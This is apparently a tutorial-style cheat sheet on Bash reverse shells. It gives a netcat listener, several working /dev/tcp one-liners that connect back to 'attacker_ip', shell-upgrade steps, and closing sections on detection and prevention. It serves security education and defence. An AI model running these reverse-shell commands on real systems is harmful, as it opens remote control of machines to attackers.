# Reverse Shells — Bash

## What is a Reverse Shell?

A reverse shell is a technique where the **target machine initiates a connection back to the attacker's machine**, rather than the attacker connecting to the target. This is useful when the target is behind a firewall that blocks incoming connections but allows outbound traffic.

```
Normal Shell:  Attacker → [connect] → Target
Reverse Shell: Attacker ← [connect] ← Target
```

---

## The Listener (Attacker Side)

Before triggering a reverse shell, the attacker must set up a listener to receive the incoming connection:

```bash
# Netcat listener
nc -lvnp 4444

# -l  listen mode
# -v  verbose
# -n  no DNS resolution
# -p  port to listen on
```

Once the target connects, the attacker gets a shell session.

---

## How Bash Reverse Shells Work

Bash can redirect file descriptors to network connections using `/dev/tcp`, a bash built-in that creates a TCP socket.

### The Pattern
```
/dev/tcp/<host>/<port>
```
This opens a TCP connection to `<host>:<port>` as a file descriptor. By redirecting stdin/stdout/stderr to this socket, you get a two-way shell.

### Breaking Down the Syntax
```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

| Part | Meaning |
|---|---|
| `bash -i` | Interactive bash shell |
| `>&` | Redirect stdout AND stderr |
| `/dev/tcp/attacker_ip/4444` | TCP socket to attacker |
| `0>&1` | Redirect stdin to the same socket (so input comes from attacker) |

---

## Bash Variants

Different environments support different syntax. If one fails, try another:

```bash
bash -i >& /dev/tcp/attacker_ip/4444 0>&1

exec bash -i &>/dev/tcp/attacker_ip/4444 <&1

bash -c 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1'

0<&196;exec 196<>/dev/tcp/attacker_ip/4444; sh <&196 >&196 2>&196
```

---

## Upgrading a Basic Shell

Raw reverse shells are often limited (no tab completion, signals like Ctrl+C kill the shell, no history).

### Method 1 — Python PTY
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
```

### Method 2 — Full TTY Upgrade (Best)
```bash
# On target — spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Background the shell: Ctrl+Z

# On attacker — configure terminal
stty raw -echo; fg

# Back on target — fix terminal size
export TERM=xterm
stty rows 40 cols 160
```

### Method 3 — script
```bash
script /dev/null -c bash
```

---

## When /dev/tcp Isn't Available

Some shells (sh, dash) don't support `/dev/tcp`. Use alternatives:

```bash
# sh with /dev/tcp fallback using exec
exec 5<>/dev/tcp/attacker_ip/4444
cat <&5 | while read line; do $line 2>&5 >&5; done

# Use netcat, python, or perl instead
```

---

## Detection (Blue Team)

Bash reverse shells leave several indicators:

- Outbound connections from unexpected processes (`bash`, web server processes)
- `/dev/tcp` usage in process args (visible in `ps aux`, `/proc/<pid>/cmdline`)
- Shell spawned by web server (e.g., `apache → bash`)
- Connections to unusual external IPs on non-standard ports

### Detection with auditd
```bash
# Monitor outbound connections from bash
auditctl -a always,exit -F arch=b64 -S connect -F exe=/bin/bash
```

---

## Defense / Prevention

- **Egress filtering** — restrict what outbound connections servers can make
- **Application firewall** — deny outbound from web server processes
- **Process monitoring** — alert on shells spawned by web servers
- **Shell restriction** — use `rbash` or container-based isolation
- **Audit logging** — capture process execution and network calls

---

## References

- [PayloadsAllTheThings — Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [RevShells.com](https://www.revshells.com/) — reverse shell generator
- [HackTricks — Shells](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells)
